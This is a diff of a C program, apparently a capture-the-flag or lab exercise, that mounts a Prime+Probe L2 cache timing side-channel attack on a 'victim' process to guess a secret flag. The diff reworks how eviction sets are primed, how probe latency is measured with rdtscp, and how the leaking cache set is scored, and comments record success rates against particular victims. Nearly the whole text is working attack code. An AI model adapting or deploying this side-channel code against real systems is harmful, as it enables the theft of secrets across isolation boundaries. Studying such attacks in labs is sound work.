@@ -11,9 +11,6 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define MIN_CYCLES 260
-#define MAX_CYCLES 420
-
 #define REPEATS 2000
 
 volatile uint8_t *buf;
@@ -50,7 +47,7 @@ void shuffle(int *arr) {
 int main() {
     /* works around 9/10 of time on victim-4. Randomize access, reverse double probe, no usleep. High synchornization required for this version
     */
-   /* works around 2/5 for victim-3 A*/
+   /* works around 2/5 for victim-3 */
    /* REVERSE PROBING*/
     printf("Attacker ready. Prime+Probe starting...\n");
     /*test wait cycles for victim*/
@@ -84,62 +81,59 @@ int main() {
 
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
+        
+
         for(int r = 0; r < REPEATS; r++) {
-
             int perm[NUM_L2_CACHE_SETS];
-
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
                 perm[i] = i;
+            }
 
             shuffle(perm);
 
-            /* PRIME all sets */
-
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
                 int set = perm[i];
 
-                for(int w = 0; w < WAYS-2; w++)
-                    tmp ^= *eviction_sets[set][w];
-            }
-
-            /* allow victim to run */
-
-            wait_cycles(6000);
-
-            /* PROBE all sets */
-
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
-
-                int set = perm[i];
-
-                uint64_t start = rdtscp();
-
-                for(int w = WAYS - 1; w >= 0; w--) {
+                /* PRIME this set */
+                for(int w = 0; w < WAYS; w++) {
                     tmp ^= *eviction_sets[set][w];
                 }
 
-                uint64_t end = rdtscp();
-                uint64_t total_time = end - start;
-                
-                if(total_time > 260)
-                    scores[set]++;
+                wait_cycles(5000);
+
+                /* PROBE this set */
+
+                uint64_t latency = 0;
+
+                for(int r = 0; r < 2; r++) {
+                    uint64_t start = rdtscp();
+
+                    for(int w = WAYS - 1; w >= 0; w--) {
+                        tmp ^= *eviction_sets[set][w];
+                    }
+
+                    uint64_t end = rdtscp();
+                    latency += (end - start);
                 }
+
+                scores[set] += latency;
             }
+        }
+        int best_set = 0;
+        uint64_t best_latency = 0;
 
-            /* pick best set */
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
-            int best_set = 0;
-            uint64_t best_score = 0;
+            uint64_t avg = scores[set] / REPEATS;
 
-            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
-                if(scores[set] > best_score) {
-                    best_score = scores[set];
-                    best_set = set;
-                }
+            if(avg > best_latency) {
+                best_latency = avg;
+                best_set = set;
             }
-        printf("Guessed flag: %d (hits=%lu)\n", best_set, best_score);
+        }
+
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
         wait_cycles(2000);
     }
